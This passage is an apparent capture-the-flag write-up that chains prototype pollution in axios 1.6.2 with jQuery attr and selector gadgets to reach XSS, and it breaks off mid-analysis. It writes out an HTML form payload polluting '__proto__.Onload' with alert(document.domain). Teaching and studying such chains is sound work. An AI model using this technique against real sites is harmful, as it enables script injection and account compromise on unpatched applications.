@@ -1,0 +1,205 @@
+It's worth noting the `SANITIZE_DOM: false` here, which disables protection against DOM Clobbering. This suggests that the challenge is related to DOM Clobbering, as this setting is deliberately turned off.
+
+The main logic of the challenge is in the `search` function:
+
+``` js
+function search(name) {
+    $("img.loading").attr("hidden", false);
+
+    axios.post("/search", $("#search").get(0), {
+        "headers": { "Content-Type": "application/json" }
+    }).then((d) => {
+        $("img.loading").attr("hidden", true);
+        const repo = d.data;
+        if (!repo.owner) {
+            alert("Not found!");
+            return;
+        };
+
+        $("img.avatar").attr("src", repo.owner.avatar_url);
+        $("#description").text(repo.description);
+        if (repo.homepage && repo.homepage.startsWith("https://")) {
+            $("#homepage").attr({
+                "src": repo.homepage,
+                "hidden": false
+            });
+        };
+    });
+};
+```
+
+Actually, there doesn't seem to be any vulnerability in the above code snippet. So after reviewing it, I went to check the libraries used in the challenge, which are jQuery 3.7.1 and axios 1.6.2. Although the file names were not mentioned, it was evident from the file contents.
+
+Upon investigation, it was found that 1.6.2 is not the latest version, and a prototype pollution vulnerability was fixed in version 1.6.4: https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e
+
+The commit even includes an exploit directly, great:
+
+``` js
+it('should resist prototype pollution CVE', () => {
+    const formData = new FormData();
+
+    formData.append('foo[0]', '1');
+    formData.append('foo[1]', '2');
+    formData.append('__proto__.x', 'hack');
+    formData.append('constructor.prototype.y', 'value');
+
+    expect(formDataToJSON(formData)).toEqual({
+      foo: ['1', '2'],
+      constructor: {
+        prototype: {
+          y: 'value'
+        }
+      }
+    });
+
+    expect({}.x).toEqual(undefined);
+    expect({}.y).toEqual(undefined);
+});
+```
+
+From the commit, it can be seen that axios has a function called `formDataToJSON` that converts FormData to JSON, and the conversion code contains a vulnerability that can be exploited through the `name` parameter for prototype pollution.
+
+Moving back to the challenge code, there is a part that executes: `axios.post("/search", $("#search").get(0)`, so as long as we can control `#search`, we can control the parameters passed here. It can be seen from the axios source code that the form passed here will eventually be converted to FormData and passed to `formDataToJSON`.
+
+Therefore, we can inject a `<form>` using the `name` to perform prototype pollution. The next step is to find a gadget, usually starting with objects.
+
+A suspicious part of the code is:
+
+``` js
+$("#homepage").attr({
+    "src": repo.homepage,
+    "hidden": false
+});
+```
+
+The parameter passed here is an object, and if the `.attr` function does not have specific checks, it could be affected by polluted parameters. In fact, in jQuery, the implementation of [attr](https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16) is as follows:
+
+``` js
+jQuery.fn.extend( {
+    attr: function( name, value ) {
+        return access( this, jQuery.attr, name, value, arguments.length > 1 );
+    },
+}
+```
+
+The implementation of [access](https://github.com/jquery/jquery/blob/main/src/core/access.js#L12) is:
+
+``` js
+export function access( elems, fn, key, value, chainable, emptyGet, raw ) {
+    var i = 0,
+        len = elems.length,
+        bulk = key == null;
+
+    // Sets many values
+    if ( toType( key ) === "object" ) {
+        chainable = true;
+        for ( i in key ) {
+            access( elems, fn, i, key[ i ], true, emptyGet, raw );
+        }
+    }
+}
+```
+
+If the key passed is an object, it will use `in` to retrieve each key. Since `in` retrieves properties on the prototype chain, we can pollute `onload` to let jQuery set the onload attribute.
+
+The payload is as follows:
+
+``` html
+<form id=search>
+  <input name=__proto__.onload value=alert(document.domain)>
+  <input name=q value=react-d3><
+</form>
+```
+
+It may seem fine, but upon testing, an error occurs:
+
+```
+Uncaught (in promise) TypeError: Cannot use 'in' operator to search for 'set' in alert(document.domain)
+```
+
+After a while of debugging, it was found that the error originated from this section when setting the `attr`:
+
+``` js
+// Attribute hooks are determined by the lowercase version
+// Grab necessary hook if one is defined
+if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
+    hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
+        ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
+}
+
+if ( value !== undefined ) {
+    if ( value === null ) {
+        jQuery.removeAttr( elem, name );
+        return;
+    }
+
+    if ( hooks && "set" in hooks &&
+        ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
+        return ret;
+    }
+
+    elem.setAttribute( name, value + "" );
+    return value;
+}
+```
+
+It first executes `hooks = jQuery.attrHooks[ name.toLowerCase() ]`, since we polluted the `onload` attribute, `jQuery.attrHooks['onload']` will be a string, making `hooks` a string as well.
+
+Next, it reaches `"set" in hooks`, as strings do not have `in` to use, hence throwing the error seen earlier.
+
+Now that we know where the problem lies, the solution is simple. Changing `onload` to `Onload` will suffice, as this way `name.toLowerCase()` will be `onload`, and `jQuery.attrHooks['onload']` will not exist.
+
+With this, the issue is resolved. It was much easier than I had imagined, taking about 3-4 hours. Then, I saw the author's [tweet](https://twitter.com/kevin_mizu/status/1744552795410456756) and realized it was an unintended, explaining why it was less challenging than expected.
+
+## Intended solution is not that difficult as well...or is it?
+
+Knowing that my solution was unintended, I began to think about what the intended solution might be. The author mentioned in Discord that the intended solution and the current unintended solution used completely different approaches, so it could be assumed that the `attr({})` part was to be excluded, leaving only the remaining code:
+
+``` js
+function search(name) {
+    $("img.loading").attr("hidden", false);
+
+    axios.post("/search", $("#search").get(0), {
+        "headers": { "Content-Type": "application/json" }
+    }).then((d) => {
+        $("img.loading").attr("hidden", true);
+        const repo = d.data;
+        if (!repo.owner) {
+            alert("Not found!");
+            return;
+        };
+
+        $("img.avatar").attr("src", repo.owner.avatar_url);
+        $("#description").text(repo.description);
+    });
+};
+```
+
+Within the remaining code, my intuition told me that the focus was on this line:
+
+``` js
+$("img.avatar").attr("src", repo.owner.avatar_url);
+```
+
+If we could use prototype pollution to change `$("img.avatar")` to `$('#homepage')`, selecting that iframe, and then with control over `repo.owner.avatar_url`, we could set the iframe's src to `javascript:alert(1)`, achieving XSS.
+
+This guess seemed very reasonable, with about a 90% chance of being correct, as using prototype pollution to affect selectors seemed new, at least to me, and it was cool! It also aligned with the author's tweet: "super interesting."
+
+So, I spent some time exploring how selectors work, but the code turned out to be more complex than I had imagined, involving many functions.
+
+After four to five hours, I finally found a point to exploit.
+
+When executing `$()`, it uses [find](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197) to locate the corresponding elements. There is a check for `documentIsHTML`, and if it is true, it typically uses native APIs like querySelector to search, with no room for manipulation.
+
+Therefore, we needed to make it false. The code for this check is [here](https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330). By making `isXMLDoc` return true, `documentIsHTML` will be false:
+
+``` js
+isXMLDoc: function( elem ) {
+    var namespace = elem && elem.namespaceURI,
+        docElem = elem && ( elem.ownerDocument || elem ).documentElement;
+
+    // Assume HTML when documentElement doesn't yet exist, such as inside
+    // document fragments.
+    return !rhtmlSuffix.test( namespace || docElem && docElem.nodeName || "HTML" );
+},
+```
